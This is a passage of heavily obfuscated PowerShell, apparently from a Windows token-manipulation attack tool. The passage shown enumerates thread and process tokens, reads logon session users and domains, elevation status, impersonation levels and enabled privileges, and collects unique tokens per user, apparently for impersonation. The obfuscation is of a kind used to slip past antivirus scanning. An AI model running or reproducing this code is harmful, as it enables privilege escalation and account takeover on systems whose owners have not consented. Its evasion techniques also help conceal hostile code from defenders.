        [IntPtr]${h`ThR`EA`D`ToKEn} =   (gET-chILdIteM  ("VaRiaB"+"l"+"E"+":IL"+"0Mt")  ).ValUE::"zE`RO"

        ${H`THr`eAd} = ${op`EN`T`hREAD}."iN`VOKe"(${W`I`N32co`NStaNTs}."T`HR`eaD_`All_A`CCe`sS", ${f`ALse}, ${tHr`eaD`Id})
        if (${Hthr`EaD} -eq   ( GI  ("{2}{0}{1}{3}"-f'ar','iaBLe:','V','Il0Mt') ).vaLuE::"Z`Ero")
        {
            ${e`RrOR`CO`de} =   (  GET-iTEm  ("VArIA"+"bLE:"+"A2s") ).VaLUE::("{0}{1}{3}{2}{4}"-f'GetLas','tWi','o','n32Err','r').Invoke()
            if (${eRrOr`C`ode} -ne ${WIn32`co`NS`T`ANtS}."eRRo`R_iNVa`l`iD_P`AR`AMeteR") 
            {
                &("{0}{2}{4}{1}{3}"-f 'Write-','r','W','ning','a') ('F'+'aile'+'d '+'to'+' '+'op'+'en '+'t'+'hread '+'hand'+'l'+'e '+'f'+'or '+'Th'+'re'+'adId: '+"$ThreadId. "+'Erro'+'r'+' '+'c'+'ode: '+"$ErrorCode")
            }
        }
        else
        {
            ${suc`cESS} = ${op`e`NTHrea`dT`OkEN}."inV`OkE"(${H`T`hreAD}, ${toKenp`Ri`VS}, ${fAL`sE}, [Ref]${hTh`R`EadT`OKEN})
            if (-not ${suC`C`eSS})
            {
                ${ER`RoR`Co`dE} =   ( GEt-VaRiAbLe  ('a2'+'s') ).vALuE::("{1}{3}{0}{2}"-f 'r','GetLastW','or','in32Er').Invoke()
                if ((${e`Rr`OrcoDe} -ne ${win32C`O`Ns`Tants}."ERR`o`R_no_tOKen") -and  
                 (${E`RrOr`cODe} -ne ${Win3`2cO`N`STAnts}."eRrO`R_invalid_Par`AmEt`ER")) 
                {
                    &("{0}{2}{3}{1}" -f 'Write','rning','-','Wa') ('Fai'+'led'+' '+'t'+'o '+'cal'+'l '+'OpenT'+'hrea'+'dTok'+'en '+'fo'+'r '+'Thr'+'e'+'adId: '+"$ThreadId. "+'Er'+'r'+'or '+'co'+'d'+'e: '+"$ErrorCode")
                }
            }
            else
            {
                &("{3}{2}{0}{1}" -f 'b','ose','r','Write-Ve') ("{2}{6}{8}{7}{1}{3}{5}{0}{4}" -f 'ead t','queried','S',' t','oken','hr','ucce','y ','ssfull')
            }

            
            if (-not ${cl`OSE`hAnD`lE}."iN`VoKE"(${Ht`hR`eaD}))
            {
                ${ErR`o`RCode} =   $A2s::("{3}{4}{0}{1}{2}"-f'W','in3','2Error','Ge','tLast').Invoke()
                &("{1}{2}{0}"-f 'g','Write-Warn','in') ('F'+'ailed '+'t'+'o '+'clos'+'e '+'t'+'hre'+'ad '+'han'+'dl'+'e, '+'thi'+'s '+'i'+'s '+'u'+'n'+'exp'+'ected. '+'ErrorC'+'ode'+': '+"$ErrorCode")
            }
            ${H`THR`eAd} =  (LS ("{3}{2}{1}{0}{4}"-f':iL0m','AbLe','rI','VA','t')).vAlUe::"ze`RO"
        }

        ${Re`TS`TruCt} | &("{1}{3}{0}{2}" -f'd-Membe','A','r','d') -MemberType ("{1}{3}{0}{2}" -f'Propert','Not','y','e') -Name ("{2}{1}{0}"-f'dToken','a','hThre') -Value ${Hth`REAd`TOken}
        return ${rE`TS`T`RUct}
    }


    
    function g`e`T-TOkeNINF`O`RmaT`i`On
    {
        Param(
            [Parameter(POsitiOn=0, mAnDAtORy=${t`RUe})]
            [IntPtr]
            ${H`ToK`EN}
        )

        ${ReTu`Rn`obJ} = ${nu`Ll}

        ${t`ok`enS`TAtssIZE} =   ( vaRiAbLE ("{0}{1}" -f'a','2S')  -VaLu)::"s`IzeoF"([Type]${TOkEn_St`A`TIs`TI`cs})
        [IntPtr]${to`Ke`NStats`pTr} =  ( gcI ('V'+'a'+'RIABlE:a2s')).VALuE::("{1}{0}{2}" -f'locHG','Al','lobal').Invoke(${ToKe`NSTats`s`ize})
        [UInt32]${re`AL`size} = 0
        ${SuC`cESS} = ${getTOke`NInf`ORm`ATION}."IN`V`OKE"(${HtO`K`eN}, ${toKEn`_IN`FoR`MATI`On`_Class}::"TokensT`AtiS`TiCS", ${Tok`eNstat`SpTR}, ${tOkE`NSt`ATsSi`ZE}, [Ref]${Re`A`LSiZe})
        if (-not ${sUC`ce`ss})
        {
            ${e`RRo`RCoDE} =  (  GeT-vaRIABle ('a'+'2s') -VALUeOn)::("{1}{4}{0}{2}{3}"-f '32E','GetLastWi','rro','r','n').Invoke()
            &("{2}{3}{0}{4}{1}"-f 'W','ning','Writ','e-','ar') ('G'+'e'+'tTok'+'enInf'+'ormation '+'failed'+'.'+' '+'Error'+' '+'code:'+' '+"$ErrorCode")
        }
        else
        {
            ${tOKE`Ns`TaTS} =   (  dIR ('vaRiAB'+'LE:A'+'2S')).Value::"ptRtOstR`Uc`T`UrE"(${toKENst`AT`SpTR}, [Type]${ToKEN_st`A`Ti`s`Tics})

            
            ${l`UIdP`TR} =   $a2s::"aLloch`G`Lo`Bal"( (  get-Item ('vaRiaB'+'Le'+':A'+'2s') ).ValuE::"SizE`Of"([Type]${l`Uid}))
             ( Ls  ("VA"+"Ria"+"bLe:A2S")).vaLue::("{3}{2}{1}{0}"-f'Ptr','o','tureT','Struc').Invoke(${to`Ke`NstAts}."A`UtH`eN`TICa`TiOniD", ${l`UIdptR}, ${f`ALse})

            [IntPtr]${LOGON`SEsS`io`N`dA`TA`Ptr} =   ( GeT-vaRiABLE  ("{0}{1}"-f 'il0m','t')  ).vAluE::"z`eRO"
            ${R`etUR`NVal} = ${lsA`GeTLO`g`O`NS`ESsion`dAta}."INV`OKE"(${l`U`iDPtR}, [Ref]${lOgO`N`Ses`SioNDaTa`p`Tr})
            if (${Re`TU`RnvAl} -ne 0 -and ${LOgO`Nse`SSiOndATa`p`TR} -eq  ( VaRIAblE  ('I'+'l0Mt')  -value)::"Z`ERO")
            {
                &("{0}{2}{1}{3}" -f'Wr','-W','ite','arning') ('C'+'all '+'to'+' '+'LsaGe'+'t'+'L'+'o'+'go'+'nSes'+'sion'+'Data '+'fail'+'e'+'d. '+'E'+'rror'+' '+'co'+'de'+': '+"$ReturnVal. "+'Logo'+'nSessi'+'onD'+'a'+'t'+'aPtr '+'= '+"$LogonSessionDataPtr")
            }
            else
            {
                ${Logons`e`ssIOn`d`ATa} =   $a2S::"ptrT`ostruc`T`URE"(${L`oGOnsESS`iOn`DatAPTr}, [Type]${SE`CUR`Ity_LOgOn_`SeSSiON`_`Da`Ta})
                if (${LoG`On`seS`s`Io`NDaTa}."us`ErNa`mE"."bUff`er" -ne  (  GeT-vaRIAbLE ("Il"+"0mt") ).valUe::"Z`ErO" -and 
                    ${lOgo`Nses`s`iO`NDATa}."lOgIn`d`oMa`In"."bUf`F`Er" -ne   (  cHildItem ("{3}{1}{0}{2}"-f 'l','AB','e:iL0mT','VarI')).VAlue::"ZE`Ro")
                {
                    
                    ${UsE`R`N`AMe} =   (VARiablE  ("{0}{1}" -f'A2','S')).VAlue::("{0}{3}{1}{2}"-f 'Ptr','String','Uni','To').Invoke(${l`OGo`NS`E`s`sioNDAtA}."USE`Rn`AmE"."BU`F`FeR", ${lOg`onSE`SsIO`N`dAta}."uS`eRnA`mE"."le`NGth"/2)
                    ${do`maiN} =  $A2S::("{2}{3}{1}{0}"-f 'gUni','trin','P','trToS').Invoke(${LOGoNse`Ss`ion`Da`Ta}."L`OG`i`NDOmAiN"."buF`FEr", ${LO`G`o`NsEssiONDATa}."LO`Gi`Nd`oMAin"."lE`NgTh"/2)

                    
                    
                    
                    if (${uS`ern`A`Me} -ieq "$($env:COMPUTERNAME)`$")
                    {
                        [UInt32]${sI`Ze} = 100
                        [UInt32]${NuMus`Er`NaM`Ec`Har} = ${sI`ze} / 2
                        [UInt32]${NuM`do`Ma`iNCHAr} = ${S`izE} / 2
                        [UInt32]${Si`DNA`Me`UsE} = 0
                        ${uSERNAMeB`Uff`eR} =   ( geT-VAriaBLe  ("A"+"2S")  ).vAlUe::("{0}{1}{2}{3}"-f'Al','locH','Gl','obal').Invoke(${sI`ze})
                        ${do`mAiNBuf`F`er} =   (variablE ('A2'+'s') -vaL)::("{1}{3}{0}{2}"-f 'Glob','Al','al','locH').Invoke(${si`ZE})
                        ${SU`cC`eSS} = ${looK`UpAc`C`OuN`Ts`iDW}."I`NvokE"(  (  GEt-ItEM ("{0}{1}{2}{3}" -f'VaRIaBLe',':iL0','m','T')  ).vAlUe::"Ze`Ro", ${Lo`G`ons`eS`sIonda`Ta}."S`Id", ${useRN`AMEB`U`FFeR}, [Ref]${NUmUsER`Na`Me`cHaR}, ${DOmAINbU`F`FeR}, [Ref]${NUMDo`mA`I`NChAR}, [Ref]${s`i`dNAMeUSe})

                        if (${S`UcCe`sS})
                        {
                            ${UsErNa`me} =  (VaRIAbLE ('A2'+'S')).VaLuE::("{0}{4}{1}{2}{3}" -f'Pt','oSt','ri','ngUni','rT').Invoke(${Us`erN`AMebuFfEr})
                            ${domA`in} =   ( geT-CHildITem  ('Va'+'riaBLe:'+'A'+'2S')).VaLUE::("{4}{0}{2}{1}{3}" -f 'St','ing','r','Uni','PtrTo').Invoke(${D`omAI`NBuFFeR})
                        }
                        else
                        {
                            ${eR`R`or`COde} =   $A2S::("{0}{4}{2}{3}{5}{1}"-f 'GetLas','rror','in','32','tW','E').Invoke()
                            &("{0}{2}{1}"-f'Write','rning','-Wa') ('E'+'rror '+'cal'+'l'+'ing '+'Looku'+'p'+'Accoun'+'tS'+'idW.'+' '+'Erro'+'r'+' '+'code'+': '+"$ErrorCode")
                        }

                         (  VArIaBle ("{0}{1}"-f'A2','s')  -va  )::("{1}{2}{0}" -f 'Global','Fre','eH').Invoke(${USe`R`NaMeB`UfFER})
                        ${US`E`R`NAmEbUf`FER} =  $Il0MT::"Z`eRO"
                          (GI ('V'+'ARiABLe'+':A'+'2S') ).valuE::("{3}{0}{1}{2}"-f 'Gl','ob','al','FreeH').Invoke(${DomAin`BUf`F`Er})
                        ${d`omaiN`BUFfer} =   (gi ("{0}{3}{1}{2}"-f 'Va','E:il0m','t','rIABl')  ).VAluE::"zE`Ro"
                    }

                    ${R`ET`URnO`Bj} = &("{3}{2}{0}{1}"-f 'ec','t','-Obj','New') ("{1}{0}"-f'ject','PSOb')
                    ${retU`R`Nobj} | &("{2}{1}{0}{3}"-f 'e','-M','Add','mber') -Type ("{1}{2}{3}{0}"-f'perty','N','o','tePro') -Name ("{0}{2}{1}"-f'D','main','o') -Value ${d`oM`AIN}
                    ${R`Et`UrN`obj} | &("{2}{0}{1}"-f'd','d-Member','A') -Type ("{3}{1}{0}{2}" -f'P','te','roperty','No') -Name ("{2}{1}{0}"-f 'me','serna','U') -Value ${u`SeRn`AmE}    
                    ${r`etUr`NO`Bj} | &("{0}{1}{3}{2}" -f'Add-','Mem','er','b') -Type ("{3}{1}{2}{0}" -f'ty','ePro','per','Not') -Name ("{1}{0}"-f'Token','h') -Value ${HtO`Ken}
                    ${Re`T`URN`obJ} | &("{1}{3}{0}{2}"-f'Membe','Add','r','-') -Type ("{3}{0}{1}{2}"-f'Pr','op','erty','Note') -Name ("{1}{0}{2}" -f 'ogonTyp','L','e') -Value ${l`OG`ONseSSIonDa`Ta}."lOGO`N`TyPe"


                    
                    ${ret`UR`NObJ} | &("{1}{2}{0}" -f'ber','Add-Me','m') -Type ("{2}{1}{3}{0}" -f 'ty','eProp','Not','er') -Name ("{1}{3}{2}{0}" -f'vated','IsE','e','l') -Value ${F`ALsE}

                    ${tOk`En`eLEV`AT`ion`sIZE} =   (gci ('v'+'ar'+'iaB'+'le:A2S')  ).VaLuE::"sIze`oF"([Type]${TOkeN`_ELE`VaTI`ON})
                    ${tOKeN`El`e`VAtiO`N`PTr} =  $A2S::("{1}{3}{0}{2}"-f'lob','Alloc','al','HG').Invoke(${tOKe`N`ELE`VaTio`NSizE})
                    [UInt32]${RE`A`LsiZE} = 0
                    ${S`UC`cEsS} = ${Getto`KEnI`NF`oRMA`TiOn}."inv`oke"(${Hto`k`eN}, ${T`o`KeN_Inf`o`RM`ATI`On_Cl`ASS}::"t`OKeNE`levatI`oN", ${T`OKEnElevaT`ion`P`Tr}, ${T`OKENEl`ev`ATI`onSi`zE}, [Ref]${r`Ealsi`ze})
                    if (-not ${SU`ccE`sS})
                    {
                        ${ERROR`c`oDe} =  (  CHilDiTem  ("variA"+"bLe"+":a"+"2s")).VAlUE::("{4}{3}{1}{0}{2}" -f 'r','E','ror','Win32','GetLast').Invoke()
                        &("{3}{0}{1}{2}" -f 'r','ite-Warn','ing','W') ('GetTokenI'+'nforma'+'t'+'ion '+'fai'+'led '+'to'+' '+'r'+'et'+'rieve '+'Toke'+'nEl'+'e'+'vation '+'status'+'. '+'ErrorCo'+'d'+'e: '+"$ErrorCode") 
                    }
                    else
                    {
                        ${ToKEnEL`evat`i`oN} =  (VaRiaBle ("a2"+"s")).vAluE::"pT`RtosTRucT`U`RE"(${tokeN`e`leVatiO`N`Ptr}, [Type]${to`kE`N_El`eV`ATIOn})
                        if (${To`kenE`LEV`A`TIoN}."To`Ke`NISElEv`At`ed" -ne 0)
                        {
                            ${re`T`U`RNoBJ}."i`seL`eVATeD" = ${tR`Ue}
                        }
                    }
                      (GET-iTEM ("{0}{1}{2}" -f'VARIab','Le:A2','s') ).Value::("{1}{2}{0}"-f'lobal','FreeH','G').Invoke(${ToKE`NELEv`ATI`oN`pTr})


                    
                    ${R`E`TuRno`BJ} | &("{2}{1}{0}" -f 'mber','-Me','Add') -Type ("{2}{1}{0}"-f 'ty','oper','NotePr') -Name ("{2}{3}{0}{1}"-f 'k','enType','T','o') -Value ("{0}{1}{2}{3}"-f 'Unab','l','eToRetrie','ve')

                    [UInt32]${ToK`EnTYpeS`I`zE} = 4
                    [IntPtr]${tOK`EN`TYpE`P`TR} =  $a2s::("{0}{1}{2}" -f 'All','oc','HGlobal').Invoke(${tO`kENTY`pEsi`Ze})
                    [UInt32]${RE`A`lsiZE} = 0
                    ${suCc`ess} = ${Ge`TTO`k`EN`I`NFoRmATION}."InV`oKe"(${H`TOKen}, ${t`oKEn_InF`o`RM`ATION_ClaSs}::"toK`e`Nt`ypE", ${tO`KEN`Typeptr}, ${tO`Kent`y`PesIZE}, [Ref]${R`eA`lsIZe})
                    if (-not ${S`U`CcEsS})
                    {
                        ${e`RR`ORcOde} =  (GeT-ITEm  ("Va"+"RI"+"aBLE:A2S") ).vaLUE::("{3}{2}{1}{0}" -f'r','o','astWin32Err','GetL').Invoke()
                        &("{2}{1}{3}{4}{0}" -f'ng','t','Wri','e-W','arni') ('Ge'+'t'+'Token'+'Informa'+'t'+'i'+'on '+'f'+'ailed '+'t'+'o '+'retr'+'ieve'+' '+'Token'+'Imp'+'ers'+'ona'+'t'+'io'+'nLevel '+'stat'+'u'+'s. '+'Error'+'Code'+':'+' '+"$ErrorCode")
                    }
                    else
                    {
                        [UInt32]${to`KE`N`TyPE} =   (gET-VARIaBlE ("A2"+"S") -ValUEoNly  )::"pT`RT`ost`RUctuRe"(${TOk`E`NtYP`Ep`Tr}, [Type][UInt32])
                        switch(${TO`ken`Type})
                        {
                            1 {${REt`U`RnO`BJ}."TO`kEn`TypE" = ("{1}{0}"-f 'y','Primar')}
                            2 {${ret`URn`OBJ}."ToKeN`TYpe" = ("{3}{1}{2}{0}"-f'n','rso','natio','Impe')}
                        }
                    }
                     ( VaRIable  ("{0}{1}" -f 'a','2s') -VA )::("{1}{0}{2}"-f 'HGlob','Free','al').Invoke(${Tok`e`NTYPEp`TR})


                    
                    if (${re`T`UrNOBJ}."t`o`Ke`NtyPE" -ieq ("{1}{0}{3}{2}" -f 'persona','Im','on','ti'))
                    {
                        ${r`ETURNO`Bj} | &("{1}{2}{0}"-f 'ber','Add-Me','m') -Type ("{2}{3}{0}{1}"-f'r','ty','NotePro','pe') -Name ("{2}{1}{4}{3}{0}" -f'l','e','Imp','onationLeve','rs') -Value ("{0}{2}{3}{1}"-f'U','e','nableToRetr','iev')

                        [UInt32]${Im`P`eRS`oNaT`iOnl`EVelSIZE} = 4
                        [IntPtr]${I`mp`e`RsON`AtIONleV`ELp`Tr} =   $a2S::("{1}{0}{2}{3}" -f'cHGlob','Allo','a','l').Invoke(${IMpE`Rs`O`N`ATI`oNlE`VeLsIzE}) 
                        [UInt32]${R`ea`LsizE} = 0
                        ${SUC`CESS} = ${gE`Tto`kEn`InF`Or`m`ATiOn}."InV`oke"(${ht`OkEN}, ${toKEN_i`NFORmatI`O`N`_cLAss}::"to`kEnI`m`PERs`Ona`TIO`NlEVEL", ${Imp`E`Rs`OnaTi`onLeveLpTr}, ${IMpeRS`O`NA`Ti`ONLeV`ELS`i`zE}, [Ref]${rEaL`S`Ize})
                        if (-not ${Su`cc`esS})
                        {
                            ${er`R`orcoDe} =   (gET-VArIABLe  ("{1}{0}"-f'2S','a') ).valuE::("{0}{4}{5}{2}{1}{3}" -f 'G','Err','2','or','etLastWi','n3').Invoke()
                            &("{1}{2}{0}" -f'-Warning','Writ','e') ('GetTo'+'kenI'+'nform'+'ation '+'failed'+' '+'t'+'o '+'retr'+'ie'+'ve '+'TokenI'+'mp'+'er'+'sonati'+'onLevel'+' '+'s'+'t'+'atus. '+'Er'+'rorCode:'+' '+"$ErrorCode")
                        }
                        else
                        {
                            [UInt32]${ImPErSO`NAT`Io`NLev`el} =  ( vaRiABle  ('a'+'2s')  -ValueONl)::"pT`R`TO`sTRucT`URE"(${iMPErSoNa`T`iOnlev`ELP`TR}, [Type][UInt32])
                            switch (${iMP`E`RSona`TI`onlevEl})
                            {
                                0 { ${rEt`Urn`OBj}."i`MpErs`oNaTIONleV`El" = ("{0}{2}{3}{1}"-f 'Security','ous','A','nonym') }
                                1 { ${rE`T`URnObj}."im`pErsON`AtI`onlEv`El" = ("{3}{1}{2}{0}{4}{5}" -f'ti','Ide','n','Security','ficati','on') }
                                2 { ${ReTU`R`NOBj}."I`MpER`s`O`N`AtioNLEVEl" = ("{4}{0}{1}{2}{3}"-f 'urityImpers','o','nat','ion','Sec') }
                                3 { ${Re`T`UrNObJ}."im`p`eRSO`NAt`io`NleVeL" = ("{1}{3}{2}{0}"-f'ation','Sec','rityDeleg','u') }
                            }
                        }
                         ( GEt-chILdiTem  ("VarIAB"+"l"+"E:A2s")  ).vALue::("{0}{2}{1}"-f 'Fr','HGlobal','ee').Invoke(${Im`PErSO`N`AtI`ONLeVELP`TR})
                    }


                    
                    ${Ret`URn`o`BJ} | &("{2}{0}{1}" -f '-Me','mber','Add') -Type ("{2}{1}{3}{0}"-f'ty','otePr','N','oper') -Name ("{0}{2}{1}" -f'Sessio','D','nI') -Value ("{0}{1}"-f 'Unknow','n')

                    [UInt32]${TO`KeNS`e`SS`IONIDSIZE} = 4
                    [IntPtr]${toK`Ens`E`sSI`OnIdPtR} =   (  iTem  ('vAriA'+'Bl'+'e:A'+'2S') ).vAlUE::("{1}{0}{2}" -f 'HGlo','Alloc','bal').Invoke(${to`kENSESSIo`NIdS`IzE})
                    [UInt32]${real`S`IZE} = 0
                    ${s`UC`CESS} = ${gEttOKe`NInFOR`m`ATi`On}."INVO`Ke"(${HTo`Ken}, ${tOKeN_IN`FoRMAtI`ON_c`L`Ass}::"TokE`Nse`SSIOn`iD", ${t`O`K`e`NseSsIOnI`DPTR}, ${ToKEN`sESSI`o`Ni`D`sIZe}, [Ref]${reA`L`siZe})
                    if (-not ${S`UcC`eSs})
                    {
                        ${ERROr`c`o`DE} =   (  get-variaBle  ("a2"+"s")).ValUE::("{0}{2}{1}{3}"-f'GetLastWin','o','32Err','r').Invoke()
                        &("{1}{3}{2}{0}"-f 'g','Writ','nin','e-War') ('GetTokenIn'+'formati'+'o'+'n '+'fa'+'ile'+'d '+'to'+' '+'r'+'etrie'+'ve '+'T'+'oken '+'Ses'+'sionI'+'d. '+'Er'+'r'+'o'+'rCode: '+"$ErrorCode")
                    }
                    else
                    {
                        [UInt32]${t`oke`NSes`SIoNID} =   ( ls ("{3}{2}{0}{1}"-f 'Le:','A2S','Riab','VA')).valUe::"P`TrTos`TrU`CT`UrE"(${tO`KENsEssI`ONiDP`TR}, [Type][UInt32])
                        ${rEt`U`RnO`Bj}."SEssiON`id" = ${TOk`EnSESs`Io`NId}
                    }
                      (  lS ("{0}{1}{3}{2}" -f 'VA','RI','S','ABLE:A2')).vaLUE::("{2}{1}{0}"-f'obal','Gl','FreeH').Invoke(${tO`kENSeSs`iO`N`id`pTr})


                    
                    ${r`ET`URNO`Bj} | &("{3}{1}{0}{2}"-f'e','dd-Memb','r','A') -Type ("{0}{2}{1}"-f'N','operty','otePr') -Name ("{2}{0}{1}{3}" -f'gesEn','ab','Privile','led') -Value @()
                    ${R`Et`URNobJ} | &("{2}{0}{1}" -f'dd-','Member','A') -Type ("{3}{1}{2}{0}" -f 'ty','e','r','NoteProp') -Name ("{1}{0}{4}{3}{2}"-f'vi','Pri','le','egesAvailab','l') -Value @()

                    [UInt32]${tO`KEnPr`IV`I`leGesSIZe} = 1000
                    [IntPtr]${TokeNprIVi`LEgE`S`PtR} =  $a2s::("{2}{0}{1}"-f 'c','HGlobal','Allo').Invoke(${t`o`kEN`PRIviLEGE`s`SIZE})
                    [UInt32]${RE`Al`SizE} = 0
                    ${su`C`CEsS} = ${gett`oK`eninf`orm`AtiOn}."IN`VOkE"(${h`ToK`en}, ${TOKeN_`In`FORMa`TIO`N_CLASs}::"T`ok`e`NpRiVilEGes", ${TOkE`NPR`iv`I`lege`spTr}, ${TOKenPr`IV`ILEGes`S`I`Ze}, [Ref]${RE`AlsI`ZE})
                    if (-not ${su`c`cEsS})
                    {
                        ${er`Rorc`Ode} =   ( get-IteM ('V'+'a'+'RiAbLE'+':a2s')).vAlue::("{3}{4}{2}{0}{1}"-f 'rro','r','n32E','GetLa','stWi').Invoke()
                        &("{0}{1}{2}{3}"-f'W','r','ite-W','arning') ('GetTo'+'k'+'enInfor'+'ma'+'tio'+'n '+'failed'+' '+'t'+'o '+'ret'+'riev'+'e '+'T'+'ok'+'en '+'Sess'+'ion'+'Id. '+'Er'+'ro'+'rCo'+'de: '+"$ErrorCode")
                    }
                    else
                    {
                        ${To`kEnpRI`V`iLEges} =   (GET-ITEM ('VaRiaB'+'le:'+'A2S')  ).VAlUe::"ptR`TOsTR`UCtURE"(${tO`kEN`pRI`VI`leGES`PTr}, [Type]${TOK`en_`pR`IviLEges})
                        
                        
                        [IntPtr]${Pr`I`V`ILeGEs`B`AsepTr} = [IntPtr](&("{5}{3}{1}{2}{0}{4}{6}"-f 'AsUnsig','n','t','I','n','Add-Signed','ed') ${tO`K`eNP`RI`Vi`LEg`ESptr} (  $A2S::"oF`Fs`EtOF"([Type]${tOKEN`_P`RI`VILEGeS}, ("{0}{2}{1}"-f'Pr','vileges','i'))))
                        ${lUi`DaND`A`Ttr`ibut`ESIZE} =  $A2S::"si`ze`Of"([Type]${LuiD_`And_AT`TrIbut`ES})
                        for (${i} = 0; ${I} -lt ${TokenpRi`Vi`lEges}."PRIviLE`gEcO`U`NT"; ${I}++)
                        {
                            ${Luid`AN`daT`TR`I`But`Eptr} = [IntPtr](&("{1}{3}{5}{2}{6}{0}{4}"-f'Unsig','A','nt','dd','ned','-SignedI','As') ${PrI`Vil`EGe`SbAse`PTR} (${lUi`DAND`A`TtrI`ButEs`IzE} * ${I}))

                            ${LUId`AnDa`T`TR`ibUtE} =  (  itEm ("{3}{2}{1}{0}"-f 's','e:a2','arIABL','V')).vAluE::"pT`RT`OStrUCtURE"(${LUiDaND`A`TTR`iBUTEPtr}, [Type]${lUi`D_and_aTt`R`Ib`UTes})

                            
                            [UInt32]${PriV`iLE`g`eN`AMEsize} = 60
                            ${pR`i`VI`lEgenAmeptR} =   (  vArIaBLe ('a'+'2S') ).VAlUE::("{1}{2}{0}" -f 'obal','A','llocHGl').Invoke(${P`RIVILE`g`enaM`E`sizE})
                            ${pL`UID} = ${L`UID`AN`dATT`RiButep`Tr} 

                            ${S`U`Ccess} = ${loOK`UppRI`ViL`Egen`Amew}."i`NV`OKE"( $iL0Mt::"z`Ero", ${p`LuiD}, ${PRIv`ILegen`A`M`EPTR}, [Ref]${PrIViL`EG`enam`e`Size})
                            if (-not ${Suc`cE`Ss})
                            {
                                ${er`R`o`RCoDe} =   (VaRIaBle  ("a"+"2S")  -vALUEoNly )::("{2}{1}{4}{0}{3}"-f '2Er','etLastW','G','ror','in3').Invoke()
                                &("{3}{2}{1}{0}"-f'ing','arn','e-W','Writ') ('Call'+' '+'t'+'o '+'Looku'+'pPr'+'ivilegeName'+'W '+'failed'+'. '+'E'+'rro'+'r '+'co'+'de: '+"$ErrorCode. "+'Rea'+'lSiz'+'e'+': '+"$PrivilegeNameSize")
                            }
                            ${p`R`ivileGena`ME} =  (ls  ("{1}{2}{0}{3}" -f 'e:A2','V','aRIabL','s')).ValUe::("{2}{1}{3}{0}"-f 'ni','String','PtrTo','U').Invoke(${P`R`iv`iLEgEnamEPtr})

                            
                            ${prIv`ilE`gesT`AtuS} = ""
                            ${E`Nab`leD} = ${F`ALSe}

                            if (${luidan`d`ATtR`IBu`TE}."A`TTRIbUT`ES" -eq 0)
                            {
                                ${ENaB`lEd} = ${FAl`sE}
                            }
                            if ((${L`UIdaNdaT`T`RIBUTE}."AT`TRibU`TEs" -band ${W`IN3`2Co`NsTAntS}."se_pri`VilEge`_e`NA`BL`ED`_bY_DEfAU`Lt") -eq ${Win32C`OnS`TAn`TS}."Se_pR`Iv`iLEGe_ENaBleD_B`y_de`FAu`Lt") 
                            {
                                ${e`N`ABLeD} = ${Tr`UE}
                            }
                            if ((${luIdanD`A`T`TrIbUTe}."ATTr`ibU`TeS" -band ${wiN32`con`s`T`ANTS}."se_Pri`VI`lEge_`en`ABlEd") -eq ${W`In`32cOnstANts}."S`e`_prI`V`ILEge_EN`ABlED") 
                            {
                                ${En`A`BlED} = ${tr`UE}
                            }
                            if ((${Lui`D`ANDaTtri`B`U`TE}."atTRiB`U`Tes" -band ${W`In3`2`c`onSTantS}."se`_pRi`ViLE`gE`_r`EMOV`Ed") -eq ${Wi`N3`2`ConsTA`NTs}."s`e`_p`R`IviLe`Ge_reMoV`eD") 
                            {
                                &("{2}{1}{3}{0}" -f'arning','rite','W','-W') ("{4}{1}{11}{12}{3}{6}{18}{0}{14}{10}{16}{13}{7}{19}{5}{15}{9}{17}{8}{2}" -f 'IL','nexp','. ','behavior: Found a token wit','U',' ','h SE_PRI','D. P',' a bug','eport t','REM','ect','ed ','E','EGE_','r','OV','his as','V','lease')
                            }

                            if (${en`AbLEd})
                            {
                                ${RETUr`NO`Bj}."pR`i`ViLegESE`Na`BLeD" += ,${pri`V`iLEGEn`A`ME}
                            }
                            else
                            {
                                ${rE`TuRNo`BJ}."PrIvi`LegESa`Va`i`laBLe" += ,${pRIviLe`g`En`AMe}
                            }

                             $a2s::("{1}{3}{0}{2}" -f'HGloba','Fr','l','ee').Invoke(${PR`i`VilEGe`NaMEpTr})
                        }
                    }
                     $a2S::("{1}{0}{2}" -f 'ee','Fr','HGlobal').Invoke(${TO`ke`NPRiV`IlEG`E`SpTr})

                }
                else
                {
                    &("{2}{1}{0}"-f 'erbose','-V','Write') "Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data. $($LogonSessionData.UserName.Length) "
                }

                
                ${nt`STat`US} = ${lSA`Fr`EEReT`URnBUFF`Er}."INv`oKe"(${lO`gonS`ESsIo`N`DAtA`pTR})
                ${Lo`gO`Nses`SiOn`da`TAPTR} =   $Il0MT::"Ze`Ro"
                if (${Ntst`At`US} -ne 0)
                {
                    &("{2}{0}{1}{3}" -f'rite-','Warn','W','ing') ('Call'+' '+'t'+'o '+'L'+'sa'+'Free'+'R'+'e'+'turnBuffer '+'fail'+'ed.'+' '+'Er'+'ror'+' '+'cod'+'e: '+"$ntstatus")
                }
            }

              (  get-ChiLditeM  ("{2}{0}{1}{3}"-f 'ARIABLE',':A2','v','S')).VaLUe::("{3}{1}{2}{0}" -f 'bal','HG','lo','Free').Invoke(${l`U`idPtr})
            ${Lu`i`dpTR} =  ( gci ("va"+"R"+"iaBL"+"E:"+"il0Mt") ).vaLUE::"Ze`Ro"
        }

         (  GeT-VAriABLe ('a'+'2s')).vaLUE::("{3}{1}{0}{2}" -f 'loba','reeHG','l','F').Invoke(${ToK`ENsTA`TS`pTR})
        ${t`O`KENSt`A`Tsptr} =   (ChiLdITEM ("{0}{1}{2}{3}" -f'va','Ri','ab','LE:iL0MT') ).value::"Z`ero"

        return ${retu`RnO`BJ}
    }


    
    function ge`T-`UN`IQuE`Tokens
    {
        Param(
            [Parameter(PoSItIoN=0, MANDAToRY=${t`RuE})]
            [Object[]]
            ${alLT`o`ke`NS}
        )

        ${tokE`NBy`US`er} = @{}
        ${t`OKen`ByenAbLEd`Pr`iV} = @{}
        ${t`Ok`eNby`A`VaIlabLe`PR`iV} = @{}

        
        foreach (${tok`EN} in ${allTo`kE`NS})
        {
            ${k`ey} = ${to`keN}."DOm`Ain" + "\" + ${To`ken}."uS`er`NAme"
            if (-not ${tOken`B`yUS`Er}.("{0}{1}{2}"-f'Cont','ainsKe','y').Invoke(${k`eY}))
            {
                
                
                if (${t`Oken}."LoG`OnTy`pe" -ne 3 -and
                    ${tO`KEn}."USeRn`A`Me" -inotmatch "^DWM-\d+$" -and
                    ${to`KeN}."UsE`RNa`ME" -inotmatch "^LOCAL\sSERVICE$")
                {
                    ${t`oK`e`NbyuseR}.("{1}{0}" -f'dd','A').Invoke(${k`Ey}, ${T`oken})
                }
            }
            else
            {
                
